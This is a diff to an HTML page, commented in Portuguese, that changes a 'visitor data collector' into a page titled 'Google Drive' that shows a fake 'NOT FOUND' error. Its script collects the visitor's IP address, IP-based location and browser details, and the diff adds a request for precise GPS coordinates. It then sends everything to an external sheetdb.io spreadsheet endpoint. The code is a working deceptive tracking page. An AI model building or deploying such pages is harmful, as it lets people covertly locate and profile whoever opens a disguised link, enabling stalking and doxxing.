@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Coletor de Dados de Visitantes</title>
+<title>Google Drive</title>
 </head>
 <body>
 <h1>Error: NOT FOUND</h1>
@@ -15,12 +15,12 @@ async function getIPandLocation() {
     const data = await response.json();
     return {
       country: data.country,
-      region: data.region,     // nome da região
-      city: data.city,         // cidade
-      postal: data.postal,     // código postal
-      lat: data.latitude,      // latitude
-      lon: data.longitude,     // longitude
-      ip: data.ip              // ip público
+      region: data.region,     
+      city: data.city,         
+      postal: data.postal,     
+      lat_ip: data.latitude,      // lat pelo IP
+      lon_ip: data.longitude,     // lon pelo IP
+      ip: data.ip              
     };
   } catch(e) {
     console.error('Erro ao obter IP/localização:', e);
@@ -40,7 +40,6 @@ function getBrowserInfo() {
 
 async function sendDataToSheet(collectedData) {
   const sheetDbUrl = 'https://sheetdb.io/api/v1/eu5qmx1222j2g';
-
   try {
     const response = await fetch(sheetDbUrl, {
       method: 'POST',
@@ -62,12 +61,32 @@ async function sendDataToSheet(collectedData) {
 async function main() {
   const ipLocationData = await getIPandLocation();
   const browserData = getBrowserInfo();
-  const collectedData = {...ipLocationData, ...browserData};
-  await sendDataToSheet(collectedData);
-}
-main();
 
-  
+  // Adicione os campos para lat/lon GPS do browser, se disponível
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition((pos) => {
+      const collectedData = {
+        ...ipLocationData,
+        lat_browser: pos.coords.latitude,
+        lon_browser: pos.coords.longitude,
+        ...browserData
+      };
+      console.log('Dados coletados (com GPS navegador):', collectedData);
+      sendDataToSheet(collectedData);
+    }, (error) => {
+      console.warn('Geolocalização do navegador negada ou falhou:', error.message);
+      // Sem GPS, envia só IP e dados do browser
+      const collectedData = {...ipLocationData, ...browserData};
+      sendDataToSheet(collectedData);
+    });
+  } else {
+    // Navegador não suporta geolocalização
+    const collectedData = {...ipLocationData, ...browserData};
+    sendDataToSheet(collectedData);
+  }
+}
+
+main();
 </script>
 
 </body>
